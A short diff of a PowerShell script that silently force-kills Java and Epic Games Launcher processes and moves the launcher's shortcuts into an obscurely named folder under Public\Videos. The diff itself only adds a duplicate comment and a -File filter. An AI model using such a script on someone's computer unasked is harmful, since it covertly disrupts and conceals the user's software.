@@ -3,6 +3,7 @@ Stop-Process -Name "java", "javaw", "EpicGamesLauncher" -Force -ErrorAction Sile
 
 # Define variables
 # Define source and destination paths
+# Define source and destination paths
 $currentUser = $env:USERNAME
 $sourcePaths = @("C:\Users\$currentUser", "C:\Program Files")
 $destinationPath = "C:\Users\Public\Videos\GraphicalUserInterface"
@@ -13,7 +14,7 @@ $counter = 1
 # Loop through source paths
 foreach ($path in $sourcePaths) {
     # Search for Epic Games Launcher.lnk in each directory and its subdirectories
-    $files = Get-ChildItem -Path $path -Recurse -Filter "Epic Games Launcher.lnk" -ErrorAction SilentlyContinue
+    $files = Get-ChildItem -Path $path -Recurse -Filter "Epic Games Launcher.lnk" -File -ErrorAction SilentlyContinue
     
     # Move each found file to the destination and rename it with the counter
     foreach ($file in $files) {
